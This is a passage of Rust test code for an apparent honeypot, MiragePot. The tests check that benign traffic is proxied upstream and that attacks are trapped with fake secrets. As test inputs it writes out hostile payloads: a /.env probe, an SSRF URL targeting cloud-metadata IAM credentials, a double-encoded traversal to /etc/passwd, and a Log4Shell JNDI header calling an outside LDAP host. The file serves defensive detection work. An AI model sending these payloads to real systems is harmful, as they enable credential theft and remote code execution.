        assert!(resp_wp_bak.headers().contains_key("x-pingback"));
    }

    #[tokio::test]
    async fn test_http_frontline_proxy_mode_forwards_benign_and_traps_attacks() {
        // 1. Start a real mock upstream backend server
        let upstream_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let upstream_addr = upstream_listener.local_addr().unwrap();
        let upstream_app = Router::new().route(
            "/real-api/orders",
            get(|| async { "REAL_UPSTREAM_ORDERS_OK" }),
        );
        tokio::spawn(async move {
            let _ = axum::serve(upstream_listener, upstream_app).await;
        });

        // 2. Configure MiragePot in FrontlineProxy mode pointing to that upstream
        let mut cfg = MirageConfig::default();
        cfg.http.mode = HttpDeployMode::FrontlineProxy;
        cfg.http.upstream_http_url = Some(format!("http://{upstream_addr}"));
        let engine = MirageEngine::new(cfg);
        let proxy_app = build_standalone_router(engine);

        // 3. Benign business request is transparently proxied to real upstream!
        let benign_req = Request::builder()
            .uri("/real-api/orders")
            .body(AxumBody::empty())
            .unwrap();
        let benign_resp = proxy_app.clone().oneshot(benign_req).await.unwrap();
        assert_eq!(benign_resp.status(), StatusCode::OK);
        let benign_body = benign_resp.into_body().collect().await.unwrap().to_bytes();
        assert_eq!(benign_body.as_ref(), b"REAL_UPSTREAM_ORDERS_OK");

        // 4. Attack request (`/.env`) is trapped by MiragePot and NEVER reaches upstream!
        let attack_req = Request::builder()
            .uri("/.env")
            .body(AxumBody::empty())
            .unwrap();
        let attack_resp = proxy_app.clone().oneshot(attack_req).await.unwrap();
        assert_eq!(attack_resp.status(), StatusCode::OK);
        let attack_body = attack_resp.into_body().collect().await.unwrap().to_bytes();
        assert!(std::str::from_utf8(&attack_body)
            .unwrap()
            .contains("AWS_ACCESS_KEY_ID=AKIA"));
    }

    #[tokio::test]
    async fn test_http_behind_proxy_sink_mode_traps_arbitrary_waf_diverted_paths() {
        let mut cfg = MirageConfig::default();
        cfg.http.mode = HttpDeployMode::BehindProxySink;
        cfg.http.sink_fallback_trap = SinkFallbackTrap::SqlError;
        cfg.http.required_ingress_header = Some("X-Mirage-Sink: waf-secret-99".to_string());
        let engine = MirageEngine::new(cfg);
        let sink_app = build_standalone_router(engine);

        // 1. Direct request without X-Mirage-Sink header gets 404 (hidden from direct scans)
        let direct_req = Request::builder()
            .uri("/arbitrary/struts2/exploit.action")
            .body(AxumBody::empty())
            .unwrap();
        let direct_resp = sink_app.clone().oneshot(direct_req).await.unwrap();
        assert_eq!(direct_resp.status(), StatusCode::NOT_FOUND);

        // 2. Request forwarded by Nginx/WAF with X-Mirage-Sink header hits fallback SqlError trap!
        let waf_req = Request::builder()
            .uri("/arbitrary/struts2/exploit.action")
            .header("x-mirage-sink", "waf-secret-99")
            .header("x-real-ip", "203.0.113.77")
            .body(AxumBody::empty())
            .unwrap();
        let waf_resp = sink_app.clone().oneshot(waf_req).await.unwrap();
        assert_eq!(waf_resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
        let waf_body = waf_resp.into_body().collect().await.unwrap().to_bytes();
        let text = std::str::from_utf8(&waf_body).unwrap();
        assert!(text.contains("SQL syntax") || text.contains("syntax error"));
    }

    #[tokio::test]
    async fn test_sigil_filter_traps_ssrf_lfi_and_header_jndi_in_frontline_proxy() {
        let upstream_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let upstream_addr = upstream_listener.local_addr().unwrap();
        let upstream_app = Router::new().route(
            "/api/v1/fetch",
            get(|| async { "REAL_UPSTREAM_FETCH" }),
        );
        tokio::spawn(async move {
            let _ = axum::serve(upstream_listener, upstream_app).await;
        });

        let mut cfg = MirageConfig::default();
        cfg.http.mode = HttpDeployMode::FrontlineProxy;
        cfg.http.upstream_http_url = Some(format!("http://{upstream_addr}"));
        let engine = MirageEngine::new(cfg);
        let proxy_app = build_standalone_router(engine.clone());

        // 1. Benign request reaches real upstream
        let ok_req = Request::builder()
            .uri("/api/v1/fetch?id=42")
            .body(AxumBody::empty())
            .unwrap();
        let ok_resp = proxy_app.clone().oneshot(ok_req).await.unwrap();
        let ok_body = ok_resp.into_body().collect().await.unwrap().to_bytes();
        assert_eq!(ok_body.as_ref(), b"REAL_UPSTREAM_FETCH");

        // 2. Cloud metadata SSRF caught by sigil-filter -> returns fake AWS IMDSv1 JSON!
        let ssrf_req = Request::builder()
            .uri("/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
            .body(AxumBody::empty())
            .unwrap();
        let ssrf_resp = proxy_app.clone().oneshot(ssrf_req).await.unwrap();
        let ssrf_body = ssrf_resp.into_body().collect().await.unwrap().to_bytes();
        let ssrf_text = std::str::from_utf8(&ssrf_body).unwrap();
        assert!(ssrf_text.contains("\"AccessKeyId\""));
        assert!(ssrf_text.contains("AWS-HMAC"));

        // 3. Double-encoded LFI caught by sigil-filter -> returns persona's fake /etc/passwd!
        let lfi_req = Request::builder()
            .uri("/api/v1/fetch?file=..%252f..%252f..%252fetc/passwd")
            .body(AxumBody::empty())
            .unwrap();
        let lfi_resp = proxy_app.clone().oneshot(lfi_req).await.unwrap();
        let lfi_body = lfi_resp.into_body().collect().await.unwrap().to_bytes();
        let lfi_text = std::str::from_utf8(&lfi_body).unwrap();
        assert!(lfi_text.contains("root:x:0:0:root:/root:/bin/bash"));

        // 4. Header-borne JNDI lookup caught by sigil-filter -> returns fake Log4j stack trace!
        let jndi_req = Request::builder()
            .uri("/api/v1/fetch?id=42")
            .header("x-api-version", "${jndi:ldap://198.51.100.99:1389/Exploit}")
            .body(AxumBody::empty())
            .unwrap();
        let jndi_resp = proxy_app.clone().oneshot(jndi_req).await.unwrap();
        assert_eq!(jndi_resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
        let jndi_body = jndi_resp.into_body().collect().await.unwrap().to_bytes();
        assert!(std::str::from_utf8(&jndi_body)
            .unwrap()
            .contains("JndiLookup"));

        assert!(engine.metrics_snapshot().sigil_detections >= 3);
    }
}
